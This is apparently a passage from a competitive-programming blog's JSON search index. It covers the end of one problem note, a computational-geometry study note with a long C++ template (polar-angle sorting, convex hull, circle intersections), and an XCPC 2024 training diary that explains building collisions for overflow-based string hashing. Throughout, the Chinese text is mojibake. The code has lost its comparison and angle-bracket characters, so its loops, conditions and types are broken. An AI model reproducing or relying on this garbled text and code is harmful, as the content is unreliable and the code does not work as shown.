å°½å¯èƒ½ç»™æ•°é‡å°‘çš„ä¸€æ–¹ã€‚æœ€åçš„ç­”æ¡ˆå³ä¸ºå·®å€¼ã€‚ä½†å¦‚æœå†™åŠ¨æ€è§„åˆ’ï¼Œå°±ä¼šå‘ç°çŠ¶æ€çš„è½¬ç§»éå¸¸çš„å¤æ‚ï¼Œåæ­£èµ›åœºä¸Šæ˜¯æ²¡å†™å‡ºæ¥ã€‚ æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š for (int i = 1;i = n;++i) if (s[i] == 2) ++cnt[2]; else if (i % 2 == 0) ++cnt[(s[i] - 0) ^ 1]; else ++cnt[s[i] - 0];for (int i = 1;i = cnt[2];++i) if (cnt[0] cnt[1]) ++cnt[0]; else ++cnt[1];printf (%d ,abs (cnt[0] - cnt[1])); ç±»ä¼¼é¢˜ç›® Folding Strip","categories":["Journal"]},{"title":"è®¡ç®—å‡ ä½• å­¦ä¹ ç¬”è®°","path":"/2024/10/30/Geometry/","content":"è·Ÿç€è¿™ä¸ªé¢˜åº“å®Œå–„è‡ªå·±çš„æ¨¡æ¿ã€‚ ä¸‰è§’åº“å‡½æ•°sin(x)/cos(x)/tan(x) ä¸‰è§’å‡½æ•° asin(x)/acos(x)/atan(x) åä¸‰è§’å‡½æ•° atan2(x,y) è¿”å›ç‚¹ $(x,y)$ çš„åæ­£åˆ‡å€¼ï¼Œä»¥å¼§åº¦ä¸ºå•ä½ã€‚è¿”å›å€¼çš„èŒƒå›´æ˜¯ $[-\\pi,\\pi]$ï¼ˆæ‰©å±•åˆ°å››ä¸ªè±¡é™ï¼‰ï¼Œä¸ atan(x) çš„å…·ä½“åŒºåˆ«å¦‚ä¸‹ï¼š æ¯ç§å‡½æ•°å…³äºç²¾åº¦é—®é¢˜æœ‰ä¸‰ç§å†™æ³•ï¼Œä»¥ atan2(x,y) ä¸ºä¾‹ï¼š double atan2 (double y, double x);float atan2f (float y, float x);long double atan2l (long double y, long double x); acos (-1.0) è®¡ç®— $\\pi$ çš„å€¼ã€‚ æè§’æ’åºçš„åº”ç”¨ æè§’ ä¸€èˆ¬ä»¥åŸç‚¹ä¸ºä¸­å¿ƒï¼Œ$x$ æ­£åŠè½´ä¸ºå§‹è¾¹ï¼Œé€†æ—¶é’ˆè½¬è¿‡çš„è§’åº¦ï¼ˆ$\\theta \\in [0,2\\pi]$ï¼‰ã€‚ æè§’æ’åºï¼ˆç¬¬ä¸‰è±¡é™ $$ ç¬¬å››è±¡é™ $$ ç¬¬ä¸€è±¡é™ $$ ç¬¬äºŒè±¡é™ï¼‰ åˆ©ç”¨ atan(x,y) ç›´æ¥æ’åºï¼ˆç²¾åº¦è¾ƒä½ï¼‰ for (int i = 1;i = n;++i) a[i] = atan2l (y[i],x[i]);sort (a + 1,a + 1 + n); åˆ©ç”¨å‰ç§¯æ’åº æ ¹æ® $A,B,O$ å›´æˆçš„é¢ç§¯ï¼ˆå­˜åœ¨æ­£è´Ÿï¼‰å³å¯åˆ¤æ–­ã€‚è‹¥é¢ç§¯ä¸ºæ­£ï¼Œåˆ™ $B$ åœ¨ $A$ çš„æ­£æ–¹å‘ï¼ˆå½“ç„¶ï¼Œè§’åº¦å°äº $\\pi$ï¼‰ï¼›åä¹‹äº¦ç„¶ã€‚ bool cmp (Point x, Point y) Point p(0, 0); // æç‚¹ Point v1 = a - p,v2 = b - p; if (v1 ^ v2 == 0) return a.x b.x;//å…±çº¿ else return v1 ^ v2 0; å…ˆæŒ‰ç…§è±¡é™åŒºåˆ†ï¼Œç„¶åæŒ‰ç…§æè§’æ’åºã€éœ€è¦åŒ…å«åæ ‡è½´ã€‘ int Qua (Point a) if (a.x 0 a.y = 0) return 1; if (a.x = 0 a.y 0) return 2; if (a.x 0 a.y = 0) return 3; if (a.x = 0 a.y 0) return 4;bool cmp (Point a,Point b) if (Qua (a) == Qub (b)) return atan2l (a.y,a.x) atan2l (b.y,b.x); else return Qua (a) Qua (b); ã€ä¾‹é¢˜ã€‘ [ICPC2021 Macao R] Laser Trap æœ¬è´¨æ˜¯ä¸‰ç‚¹èƒ½ä¸èƒ½å½¢æˆä¸€ä¸ªåŒ…å›´ä½åŸç‚¹çš„ä¸‰è§’å½¢ã€‚é‚£ä¹ˆå°±å¯ä»¥å…ˆæè§’æ’åºï¼Œç„¶åç”¨åŒæŒ‡é’ˆï¼Œå¦‚æœä¸¤ç‚¹çš„æç‚¹å·®å€¼å°äº $\\pi$ï¼Œé‚£ä¹ˆå°±ä¸ä¼šç»è¿‡åŸç‚¹ï¼Œå¯ä»¥ä¿ç•™ã€‚ä¸ºäº†æ–¹ä¾¿ä¹¦å†™ä»£ç ï¼Œå¯ä»¥ç ´ç¯ä¸ºé“¾ã€‚åŒæ—¶ï¼Œè¿™é“é¢˜éœ€è¦æ³¨æ„ç²¾åº¦é—®é¢˜ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š for (int i = 1;i = n;++i) a[i + n] = a[i] + 2 * pi;//pi = acosl(-1);for (int i = 1;i = n;++i) while (p = 2 * n a[p] - a[i] pi) ++p; ans = min (ans,p - 1 - i); Computational Geometry(2D) using LD = long double;const LD pi = acos (-1.0);const LD eps = 1e-8;int dcmp (LD x) return x -eps ? -1 : (x eps ? 1 : 0);struct Point LD x,y;Point (LD x = 0,LD y = 0) : x (x),y (y) ;struct Circle Point O;LD r;Circle (Point O = Point (),LD r = 0) : O (O),r (r) ;typedef Point Vector;Vector operator + (Vector A,Vector B) return Vector (A.x + B.x,A.y + B.y);Vector operator - (Vector A,Vector B) return Vector (A.x - B.x,A.y - B.y);Vector operator * (Vector A,LD k) return Vector (A.x * k,A.y * k); Vector operator / (Vector A,LD k) return Vector (A.x / k,A.y / k); LD dot (Vector A,Vector B) return A.x * B.x + A.y * B.y; LD dis (Point A,Point B) return sqrt ((A.x - B.x) * (A.x - B.x) + (A.y - B.y) * (A.y - B.y)); LD cross (Vector A,Vector B) return A.x * B.y - A.y * B.x; // A - B counter-clockwise if cross (A,B) 0LD len (Point A) return sqrt (A.x * A.x + A.y * A.y);LD angle (Vector A,Vector B) return acos (dot (A,B) / (len (A) * len (B)));Vector proj (Vector A,Vector B) return A * (dot (A,B) / dot (A,A)); //project onto APoint foot (Point P,Point A,Point B) Vector AP = P - A,AB = B - A;return A + proj (AB,AP); //footPoint reflect (Point P,Point A,Point B) Point F = foot (P,A,B);return F * 2 - P; //symmetry pointPoint rotate (Point P,LD theta) return (Point)P.x * cos (theta) - P.y * sin (theta),P.x * sin (theta) + P.y * cos (theta);bool on_line (Point P,Point A,Point B) return dcmp (cross (P - A,B - A)) == 0;bool on_seg (Point P,Point A,Point B) return on_line (P,A,B) dcmp (dot (P - A,P - B)) = 0; //judge whether on segment ABLD dis_seg (Point P,Point A,Point B) if (dcmp (dot (B - A,P - A)) 0) return dis (P,A); if (dcmp (dot (A - B,P - B)) 0) return dis (P,B); return fabs (cross (P - A,P - B)) / dis (A,B);Point inter_line (Point A,Point B,Point C,Point D) return A + (B - A) * cross (C - A,D - C) / cross (B - A,D - C);bool pd_ll_inter (Point A,Point B,Point C,Point D) return dcmp (cross (B - A,D - C)) != 0; // line - linebool pd_ls_inter (Point A,Point B,Point C,Point D) return on_line (inter_line (A,B,C,D),C,D); //The intersection of AB(line) and CD (line) is on the CD (seg).bool pd_ss_inter (Point A,Point B,Point C,Point D) // seg - seg LD c1 = cross (B - A,C - A),c2 = cross (B - A,D - A); LD d1 = cross (D - C,A - C),d2 = cross (D - C,B - C); if (dcmp (c1) * dcmp (c2) 0 dcmp (d1) * dcmp (d2) 0) return true; if (dcmp(c1) == 0 on_seg (C,A,B)) return true; if (dcmp(c2) == 0 on_seg (D,A,B)) return true; if (dcmp(d1) == 0 on_seg (A,C,D)) return true; if (dcmp(d2) == 0 on_seg (B,C,D)) return true; return false;LD area (vector Point P) int n = P.size (); LD res = 0; for (int i = 0;i n;++i) res += cross (P[i],P[(i + 1) % n]); return res / 2.0;bool is_convex (vector Point P) int n = P.size (); for(int i = 0;i n - 1;++i) if (dcmp (cross (P[i + 1] - P[i],P[(i + 2) % n] - P[i])) 0) return false; return true;int in_Poly (vector Point P,Point A) int cnt = 0,n = P.size (); for (int i = 0;i n;++i) int j = (i + 1) % n; if (on_seg (A,P[i],P[j])) return 2;// on the edge if (A.y = min (P[i].y,P[j].y) A.y max (P[i].y,P[j].y)) // the intersection is on the right cnt += dcmp (((A.y - P[i].y) * (P[j].x - P[i].x) / (P[j].y - P[i].y) + P[i].x) - A.x) 0; return cnt 1;vector Point convex_hull (vector Point P) // strict convex hull (= 0) int n = P.size (); sort (P.begin (),P.end (),[] (Point x,Point y) return x.x == y.x ? x.y y.y : x.x y.x;); vector Point hull; hull.resize (2 * n + 1); int k = 0; for (int i = 0;i n;++i) while (k = 2 dcmp (cross (hull[k - 1] - hull[k - 2],P[i] - hull[k - 2])) = 0) --k; hull[k++] = P[i]; for (int i = n - 2,t = k;i = 0;--i) while (k t dcmp (cross (hull[k - 1] - hull[k - 2],P[i] - hull[k - 2])) = 0) --k; hull[k++] = P[i]; hull.resize (k - 1); return hull;LD diameter (vector Point P) int n = P.size (); if (n = 1) return 0; if (n == 2) return len (P[1] - P[0]); LD res = 0; for (int i = 0,j = 2;i n;++i) while (dcmp (cross (P[(i + 1) % n] - P[i],P[j] - P[i]) - cross (P[(i + 1) % n] - P[i],P[(j + 1) % n] - P[i])) = 0) j = (j + 1) % n; res = max (res,max (len (P[j] - P[i]),len (P[j] - P[(i + 1) % n]))); return res;bool in_cir (Circle C,Point P) return dcmp (len (P - C.O) - C.r) = 0;Point get_cir_p (Circle C,LD theta) return C.O.x + C.r * cos (theta),C.O.y + C.r * sin (theta);int pd_lc_inter (Point A,Point B,Circle C) double d = dis_seg (C.O,A,B); if (dcmp (d - C.r) == 0) return 0; // tangent if (dcmp (d - C.r) 0) return -1; // separation return 1; // intersectionint pd_cc_inter (Circle A,Circle B) // the number of tagent lines LD d = len (A.O - B.O); if (dcmp (A.r + B.r - d) 0) return 4; // externally separate if (dcmp (A.r + B.r - d) == 0) return 3; // externally tangent if (dcmp (fabs (A.r - B.r) - d) == 0) return 1; // internally tangent if (dcmp (fabs (A.r - B.r) - d) 0) return 0; // one circle inside the other return 2; // intersectionpair Point,Point lc_inter (Point A,Point B,Circle C) Point F = foot (C.O,A,B);LD d = dis (C.O,F); Vector E = (B - A) / dis (A,B); Point P1 = F - E * sqrt (C.r * C.r - d * d); Point P2 = F + E * sqrt (C.r * C.r - d * d); return P1,P2;pair Point,Point cc_inter (Circle A,Circle B) Vector k = B.O - A.O; LD d = len (k); LD alpha = atan2 (k.y,k.x),beta = acos ((A.r * A.r + d * d - B.r * B.r) / (2 * A.r * d)); Point P1 = get_cir_p (A,alpha - beta),P2 = get_cir_p (A,alpha + beta); return P1,P2;pair Point, Point tan_cir (Point P,Circle C) LD d = len (C.O - P),theta = asin (C.r / d); Vector E = (C.O - P) / d; Vector P1 = P + (rotate (E,theta) * sqrt (d * d - C.r * C.r)); Vector P2 = P + (rotate (E,-theta) * sqrt (d * d - C.r * C.r)); return P1,P2;Circle triangle_incir (Point A,Point B,Point C) LD a = dis (B,C),b = dis (A,C),c = dis (A,B); Point O = (A * a + B * b + C * c) / (a + b + c); return O,dis_seg (O,A,B);Circle triangle_circum (Point A,Point B,Point C) LD Bx = B.x - A.x,By = B.y - A.y,Cx = C.x - A.x,Cy = C.y - A.y; LD D = 2 * (Bx * Cy - By * Cx); LD x = (Cy * (Bx * Bx + By * By) - By * (Cx * Cx + Cy * Cy)) / D + A.x; LD y = (Bx * (Cx * Cx + Cy * Cy) - Cx * (Bx * Bx + By * By)) / D + A.y; Point P (x,y); return Circle (P,dis (A,P));vector pair Point,Point get_tangents (Circle A,Circle B) vector pair Point,Point tangents; LD d = len (A.O - B.O),dif = A.r - B.r,sum = A.r + B.r; if (dcmp (d - fabs (dif)) 0) return tangents; LD base = atan2 (B.O.y - A.O.y,B.O.x - A.O.x); if (dcmp (d - fabs (dif)) == 0) tangents.push_back (get_cir_p (A,base + (A.r B.r ? pi : 0)),get_cir_p (A,base + (A.r B.r ? pi : 0))); return tangents; LD theta = acos (dif / d); tangents.push_back (get_cir_p (A,base + theta),get_cir_p (B,base + theta)); tangents.push_back (get_cir_p (A,base - theta),get_cir_p (B,base - theta)); if (dcmp (d - sum) == 0) tangents.push_back (get_cir_p (A,base),get_cir_p (A,base)); if (dcmp (d - sum) 0) theta = acos (sum / d); tangents.push_back (get_cir_p (A,base + theta),get_cir_p (B,base + theta + pi)); tangents.push_back (get_cir_p (A,base - theta),get_cir_p (B,base - theta + pi)); return tangents;LD tri_ploy_area (Point A,Point B,Circle C) Vector OA = A - C.O,OB = B - C.O; LD S = cross (OA,OB),sign = dcmp (cross (OA,OB)) 0 ? 1 : -1; bool da = dcmp (len (OA) - C.r) 0,db = dcmp (len (OB) - C.r) 0; if (dcmp (S) == 0) return 0; if (da db) return S * 0.5; // triangle if (!da !db) if (pd_lc_inter (A,B,C) == 1)// arc + triangle + arc auto [P1,P2] = lc_inter (A,B,C); Vector OP1 = P1 - C.O,OP2 = P2 - C.O; if (dis (A,P1) dis (A,P2)) swap (P1,P2); return cross (OP1,OP2) * 0.5 + sign * 0.5 * C.r * C.r * (angle (OA,OP1) + angle (OB,OP2)); else return sign * 0.5 * C.r * C.r * angle (OA,OB); // arc else // triangle + arc auto [P1,P2] = lc_inter (A,B,C); if (on_seg (P2,A,B)) swap (P1,P2); Vector OP1 = P1 - C.O; if (dcmp (len (OA) - C.r) 0) return cross (OA,OP1) * 0.5 + sign * 0.5 * C.r * C.r * angle (OP1,OB); else return cross (OP1,OB) * 0.5 + sign * 0.5 * C.r * C.r * angle (OP1,OA); LD cc_area (Circle C1,Circle C2) int op = pd_cc_inter (C1,C2); if (op = 1) return pi * min (C1.r,C2.r) * min (C1.r,C2.r); else if (op == 4) return 0; else LD d = dis (C1.O,C2.O); LD alpha = 2 * acos ((C1.r * C1.r - C2.r * C2.r + d * d) / (2 * C1.r * d)); LD beta = 2 * acos ((C2.r * C2.r - C1.r * C1.r + d * d) / (2 * C2.r * d)); return 0.5 * (C1.r * C1.r * (alpha - sin (alpha)) + C2.r * C2.r * (beta - sin (beta)));","categories":["Algorithm"]},{"title":"XCPC 2024","path":"/2024/09/01/XCPC2024/","content":"$2024.8.25$ ç»„é˜Ÿç”±æˆ‘ SUNCHAOYI å’Œä¸¤ä½å¤§ä½¬ oahgnail, Erusel ç»„æˆã€‚ ã€è¯´å¥é—²è¯ï¼Œç”±äºç»„é˜Ÿæœ‰ç‚¹åŒ†å¿™ï¼Œæˆ‘å’Œ Erusel æ„£æ˜¯èŠ±äº†ä¸€ä¸‹åˆä»æ–°ç”Ÿç¾¤ä¸­çš„å¼ºçœä¸€ä¸ªä¸ªäººè‚‰æœç´¢æ‰¾åˆ°çš„é˜Ÿå‹ã€‚ã€‘ å¥½äº†ï¼Œé˜Ÿåè¿˜æ˜¯è¦ä¹±æçš„ï¼Œäºæ˜¯å°±æœ‰äº†ï¼š ä¸­æ–‡é˜Ÿåï¼šä»šå±³å±²å†š(xiÄn xiÄn wÄ kÇn) \\\\ è‹±æ–‡é˜Ÿåï¼šSupercalifragilisticexpialidocious $2024.8.28$ ç¬¬ä¸€æ¬¡è®­ç»ƒæ‰“çš„æ˜¯ä»Šå¹´çš„æ­ç”µå¤šæ ¡ï¼ˆ2ï¼‰ï¼Œæ—¶é—´ä¸å¤ªå¤šåªæ‰“äº†å››ä¸ªå°æ—¶ã€‚ ä¸€äººå››é¢˜ï¼Œæˆ‘å¼€çš„æ˜¯æœ€åå››é¢˜æ¯’ç˜¤æ•°æ®ç»“æ„+æ¨¡æ‹Ÿ+å­—ç¬¦ä¸²+ç¥å¿…å›¾è®ºã€‚å‘ç°è‡ªå·±åªä¼šä¸€é¢˜ï¼Œä¸è¿‡è¿˜æ˜¯ WA äº†ä¸€å‘ã€‚æŠŠä¸¤é¢˜å¼±æ™ºæ¨¡æ‹Ÿæ‰“è¿‡ä»¥åå°±åˆ°äº†å£èƒ¡ç¯èŠ‚ï¼Œåæ­£å°±æ˜¯ä¸€é¡¿å£èƒ¡åæ¥ä¸åŠå†™ä¸€ç‚¹ã€‚ ç”±äºç¬¬ä¸€æ¬¡æ‰“ï¼Œå››å°æ—¶åªå¹²å‡ºäº†äº”é¢˜ã€‚ èµ›åè¡¥é¢˜ï¼š oahgnailåœ¨é­”æ–¹è¿™é¢˜å†™äº†ä¸€ä¸ªè¶…çº§å¤§æ¨¡æ‹Ÿï¼Œä½†è¢«Eruselä¸€è¯­é“ç ´åªéœ€è¦å¤„ç†å…­ä¸ªè§’çš„æƒ…å†µï¼Œç„¶åç¬é—´ç ´é˜²ã€‚ æˆ‘æŠŠåœ°ç‰¢è¿™é¢˜è®¢æ­£äº†ï¼Œç®€å•æ¥è¯´å°±æ˜¯çŠ¶å‹å¤„ç†åçš„æƒ…å†µæœç´¢ï¼Œç»†èŠ‚å¾ˆå¤šæ„Ÿè§‰ä¸å¤ªå¥½å†™ã€‚ é¡ºä¾¿è®¢æ­£äº†å›¾è®¡ç®—ï¼Œå‘ç°å’Œ $\\texttt{CSP 2022 T3}$ çš„æ€è·¯ç›¸è¿‘ï¼Œç”¨å­—ç¬¦ä¸²å“ˆå¸Œçš„å½¢å¼å»åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼Œç›´å‘¼å¥½ trickã€‚ $2024.8.30$ ç¬¬äºŒæ¬¡è®­ç»ƒæ‰“çš„æ­ç”µå¤šæ ¡ï¼ˆ3ï¼‰ï¼Œä¸è¿‡è¿å››å°æ—¶éƒ½æ²¡æ‰“æ»¡ï¼Œä»ç„¶è¿˜æ˜¯è¿‡äº†äº”é¢˜ã€‚ è¿™æ¬¡å¼€é¢˜å‘ç°æœ‰ä¸€é“æ¯”è¾ƒè£¸çš„çº¿æ®µæ ‘å’Œä¸€é“éœ€è¦å¤„ç†çš„å›¾è®ºï¼Œæœæ–­å¼€å†™ã€‚ å•å³°æ•°åˆ—ç›´æ¥é€šè¿‡å·®åˆ†å°†ä¿¡æ¯è¿›è¡Œè½¬åŒ–ï¼Œç„¶åç»´æŠ¤å·®åˆ†æ˜¯å¦ $,,=$ ä»¥åŠå•å³°ï¼ˆå¯ä»¥ç”±å‰é¢çš„ä¿¡æ¯è¿›è¡Œè½¬åŒ–ï¼‰çš„çŠ¶æ€ï¼Œå•ç‚¹æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ï¼Œç”šè‡³ä¸éœ€è¦ pushdown(cur)ã€‚å†™å®Œç›´æ¥è¿‡æ ·ä¾‹ï¼Œä¸€å‘ ACã€‚ æ¯”ç‰¹è·³è·ƒ å®šä¹‰ $x \\to y$ çš„ä»£ä»·æ˜¯ $k \\times (x | y)$ï¼Œä¸»è¦éœ€è¦åˆ†æå‡ºä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨è·³è·ƒæ˜¯æ›´ä¼˜çš„ã€‚å…ˆè·‘ä¸€éæœ€çŸ­è·¯ï¼Œç„¶åç”¨è·³è·ƒçš„ä»£ä»·å»æ›´æ–°æœ€çŸ­è·¯å³å¯å®Œæˆã€‚ã€å½©è›‹ï¼šæœ¬äººæŠŠ dij ç»™å†™é”™äº†å¯¼è‡´ä¸€ç›´è¿‡ä¸äº†æ ·ä¾‹ï¼ˆè™½ç„¶æœ€åè¿˜æ˜¯ä¸€å‘ AC äº†ï¼Œä½†æ˜¯æ˜¾å¾—å¾ˆè ¢ï¼‰ã€‚ã€‘ é˜Ÿå‹è¿™è¾¹ï¼Œè¿˜ä¸€ç›´å¡åœ¨ä¸‰åˆ†ä¸Šï¼Œç›´æ¥ç½šæ—¶ä¸€è½¦ï¼ˆå¥½åœ¨é€šè¿‡äº†ï¼‰ã€‚ $2024.8.31$ å“ˆå¸Œä¹‹è‡ªç„¶æº¢å‡ºå•¥äº‹æ²¡æœ‰ï¼Ÿä¸‡æ¶ä¹‹æºï¼šä¸åŸºæœ¬å­ä¸²ç»“æ„ã€‚ æ¯’ç˜¤æ•°æ®ç«Ÿç„¶æŠŠè¿™ä¸ªç»™å¡äº†ï¼Œæ‰€ä»¥å¥½å¥½å»ç ”ç©¶äº†ä¸€ä¸‹ã€‚ è‡ªç„¶æº¢å‡ºç›¸å½“äºæ˜¯å–ä½™ $2^{64}$ï¼Œæ‰€ä»¥éœ€è¦å°è¯•æ„é€ å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå“ˆå¸Œå€¼èƒ½å¤Ÿ $\\mod 2^{64}$ ä¸€æ ·å³å¯ã€‚ åº•æ•° $p$ ä¸ºå¶æ•° æ„é€  baaa ... a $(a \\times 64)$ å’Œ caaa...a $(a \\times 64)$ã€‚å¯¹äºç¬¬ä¸€ä¸ªä½ç½®ä¸Šå­—ç¬¦çš„å“ˆå¸Œå€¼ï¼Œ$hsh(â€˜bâ€™)\\times p^{64} \\mod 2^{64}$ å’Œ $hsh(â€˜câ€™)\\times p^{64} \\mod 2^{64}$ã€‚ç”±äº $2 \\mid p$ï¼Œåˆ™æœ‰ $2^{64} \\mid p^{64}$ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªä½ç½®ä¸Šå“ˆå¸Œå€¼å»æ¨¡åçš„è´¡çŒ®å‡ä¸º $0$ï¼Œå³ä¼šå‡ºç°å“ˆå¸Œç¢°æ’çš„æƒ…å†µã€‚ åº•æ•° $p$ ä¸ºå¥‡æ•° é¦–å…ˆè§„å®šï¼š $s_1 = â€˜aâ€™$ $\\overline {s}$ è¡¨ç¤ºå°† $s$ ä¸­çš„ a å˜ä¸º bï¼Œb å˜ä¸º a $s_i = s_{i - 1} + \\overline {s_{i - 1}}$ $f_i = hsh (s_i) - hsh (\\overline {s_{i}})$ æ˜¾ç„¶ $s_i$ çš„é•¿åº¦ä¸º $2^{i - 1}$ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°ï¼š hsh(s_i) = hsh(s_{i - 1}) \\times p^{2^{i - 1}} + hsh (\\overline {s_{i - 1}})\\\\ hsh(\\overline{s_i}) = hsh(\\overline{s_{i - 1}}) \\times p^{2^{i - 1}} + hsh(s_{i - 1})ä½œå·®å¯çŸ¥ï¼Œ$f_i = f_{i - 1} \\times (p^{2^{i - 1}} - 1)$ã€‚æœ‰å¥‡å¶æ€§å¯çŸ¥ï¼Œ$2^{64} \\mid f_{64}$ï¼Œå³ $s_{64}$ ç¬¦åˆæ¡ä»¶ï¼Œå¯ä»ç„¶å¯ä»¥ç¼©å‡é•¿åº¦ã€‚ ç”±å› å¼åˆ†è§£å¯çŸ¥ $p^{2^{i - 1}} - 1 = (p^{2^{i - 2}} - 1) \\times (p^{2^{i - 2}} + 1) = (p^{2^{i - 2}} + 1) \\times (p^{2^{i - 3}} + 1) \\times \\cdots \\times (p^{2^1 } + 1) \\times (p^{2^1} - 1)$ï¼Œå› æ­¤ $2^{1 + 2 + \\cdots (i - 1)} = 2^{\\frac{i(i - 1)}{2}} \\mid f_i$ã€‚æ‰€ä»¥ $i 11$ æ—¶å‡ä¼šå†²çªï¼Œå³æœ€å°æ„é€ å‡º $s_{12}$ å’Œ $\\overline{s_{12}}$ ä¾¿ä¼šå†²çªã€‚ $2024.09.06$ ç½‘ç»œèµ›æ¨¡æ‹ŸVP äº†å»å¹´ç½‘ç»œèµ›çš„ç¬¬ä¸€åœºï¼Œæœ€ååˆ‡äº†å…­é“é¢˜ã€‚ç„¶è€Œå£èƒ¡å‡ºçš„æ˜¯ä¹é¢˜ï¼Œä½†æ˜¯æ²¡æ¥å¾—åŠå®ç°ï¼Œæœ€å $1.5$ å°æ—¶æ²¡æœ‰è¿‡é¢˜ï¼Œè¿™æ˜¯ååˆ†é—æ†¾çš„ã€‚ä»¥åŠæˆ‘ä»¬æ˜¯è¶…çº§æ— æ•Œå¤šçš„ç½šæ—¶ï¼Œå·²ç»æ²¡æ•‘äº†â€¦â€¦ æˆ‘å†™çš„æ˜¯ $A,G,I$ï¼Œé˜Ÿå‹å†™çš„ $D,J,L$ï¼Œåæ­£åªæœ‰ $L$ æ˜¯ä¸€æ¬¡è¿‡çš„ã€‚ $A,L$ æ˜¯ç­¾åˆ°æ¨¡æ‹Ÿï¼Œè®²ä¸ªç¬‘è¯ï¼Œ$A$ æˆ‘å¿˜è®°åˆ å» freopen è€ŒæŒ‚äº†ä¸€æ¬¡ã€‚æ¥ä¸‹æ¥ä¸€ä¸ªè®¡æ•°é¢˜ä¸¢ç»™äº†æˆ‘ã€‚å¤§è‡´é¢˜æ„æ˜¯æ¯æ¬¡ç»™å®šä¸¤ä¸ªå—ï¼Œç„¶åéšæœºé€‰å—çš„ç‚¹è¿è¾¹ï¼Œé—®èƒ½å˜ä¸ºé¢˜ç›®æ‰€ç»™æ ‘çš„æ¦‚ç‡ã€‚éš¾ç‚¹åœ¨äºæ€ä¹ˆåˆ¤æ–­ç­”æ¡ˆä¸º $0$ çš„æƒ…å†µã€‚è€ƒè™‘ä¸¤ä¸ªå—ï¼Œè‹¥ç»™å®šçš„æ ‘æœ‰è¿è¾¹ï¼Œé‚£ä¹ˆå¯ä»¥è¯´æ˜è¿™ä¸¤ä¸ªå—æ˜¯æœ‰è”ç³»çš„ï¼Œä¹Ÿå°±æ˜¯æ€»æœ‰ä¸€ä¸ªå—çš„çˆ¶äº²ç»“ç‚¹æ˜¯å¦ä¸€ä¸ªå—ä¸­çš„ç»“ç‚¹ã€‚å› æ­¤ï¼Œå¯ä»¥æŒ‰ç…§æ·±åº¦è¿›è¡Œå¹¶æŸ¥é›†çš„åˆå¹¶ä»¥åŠåˆ¤æ–­æ— è§£çš„æƒ…å†µï¼Œæ¯æ¬¡çš„æ¦‚ç‡å°±ç›¸å½“äº $\\frac{1}{cnt_x cnt_y}$ï¼ˆ$cnt_i$ è¡¨ç¤ºæŸä¸ªå—çš„å¤§å°ï¼‰ã€‚å†è®²ä¸ªç¬‘è¯ï¼Œç”±äºä¹˜èµ·æ¥çš„æ—¶å€™å¿˜è®°å–æ¨¡ï¼Œå¯¼è‡´ WA äº†å¥½å¤šæ¬¡ã€‚ ç„¶åå†æ˜¯ $D,J$ï¼Œå¥½åƒä¸€ä¸ªæ˜¯å¹¶æŸ¥é›†å’Œè¿é€šå—çš„é¢˜ï¼Œè¿˜æœ‰ä¸€ä¸ªæ•°å­¦ç­¾åˆ°ï¼ˆä¸è¿‡ä¹Ÿåˆ†æäº†è›®ä¹…çš„æ ·å­ï¼‰ã€‚ $I$ æ˜¯ä¸€é“ç»†èŠ‚å·¨å¤šçš„è®¡æ•° DPï¼ˆè¿™ç§ä¸œè¥¿æ€ä¹ˆè€æ˜¯ä¸¢ç»™æˆ‘ï¼‰ï¼Œéœ€è¦æ—¶é—´å’Œç©ºé—´ä¸Šçš„åŒé‡ä¼˜åŒ–ã€‚è®¾ $dp_{i,j,k}$ è¡¨ç¤ºç¬¬ $i$ ä½å¡« $j$ï¼Œç„¶å $k$ æ˜¯ä¸€ä¸ªçŠ¶æ€ï¼Œè®°å½•å¤§å°å†™ä»¥åŠæ•°å­—æ˜¯å¦å‡ºç°è¿‡ã€‚ç”±äºç›¸é‚»ä¸¤ä¸ªä¸èƒ½é‡å¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ä¹‹å‰çš„æ€»æ•°å‡å»ç›¸é‚»ä¸¤ä¸ªç›¸åŒæ—¶çš„æƒ…å†µï¼Œä»è€Œä¼˜åŒ–å¤æ‚åº¦åˆ° $O(62 \\times 8 \\times n)$ã€‚ç„¶ååˆå‘ç°å¯ä»¥ç”¨æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ç©ºé—´ï¼Œå˜ä¸º $O(62 \\times 2 \\times 8)$ï¼Œäºæ˜¯åšå®Œäº†ã€‚ä½†å†™çš„æ—¶å€™ä¸€ä¸ªåœ°æ–¹æ‰“é”™äº†ï¼Œä»¥åŠæ»šåŠ¨æ•°ç»„æ¸…ç©ºå†™ç‚¸äº†ï¼Œå¯¼è‡´ WA äº†å¥½å¤šå¥½å¤šæ¬¡ï¼ˆæ²¡æ•‘äº†â€¦â€¦ï¼‰ã€‚ ç„¶å $H$ æ˜¯æˆ‘ä»¬å¿«è®¨è®ºå‡ºæ¥çš„é¢˜ç›®ï¼Œä½†æ˜¯è¢«å“ˆå¸Œå¦‚ä½•å¿«é€Ÿåˆ¤æ–­ $p$ æ˜¯ä¸æ˜¯ $S_i$ çš„å‘¨æœŸçš„æ—¶å€™å¡ä½äº†ã€‚åæ¥æœ€åæƒ³åˆ°äº† borderï¼Œä½†æ˜¯æ˜¾ç„¶æ²¡æ—¶é—´äº†ã€‚é¦–å…ˆå…ˆæƒ³åˆ°äº†å¯¹äº $S_p$ï¼Œæ˜¾ç„¶ $p$ æ˜¯å®ƒçš„å‘¨æœŸï¼Œç„¶åå‘ç°å¯ä»¥äºŒåˆ† $w(w \\ge p)$ï¼Œä»è€Œæ‰¾åˆ° $S_p,S_{p + 1},\\cdots,S_w$ å‡æ»¡è¶³ $p$ æ˜¯å®ƒä»¬çš„å‘¨æœŸã€‚ä¹‹åå°±æ˜¯ç¦»çº¿å¤„ç† $(k,l,r)$ï¼Œåˆ†åˆ«æŒ‰ç…§ $k,w$ ä»å¤§åˆ°å°æ’åºï¼Œå¤„ç†è¯¢é—®çš„æ—¶å€™åˆ©ç”¨åŒæŒ‡é’ˆçš„æƒ³æ³•å°† $w \\ge k$ çš„å‡åŠ å…¥åˆ°çº¿æ®µæ 